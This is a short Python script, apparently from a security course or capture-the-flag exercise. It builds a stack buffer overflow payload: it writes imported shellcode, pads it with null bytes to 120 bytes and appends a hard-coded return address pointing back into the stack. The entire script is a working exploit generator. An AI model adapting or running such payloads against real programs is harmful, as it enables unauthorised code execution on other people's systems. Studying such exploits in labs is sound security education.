#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\x00'*(120-len(shellcode)))
sys.stdout.buffer.write(0x7ffffff69550.to_bytes(8,'little'))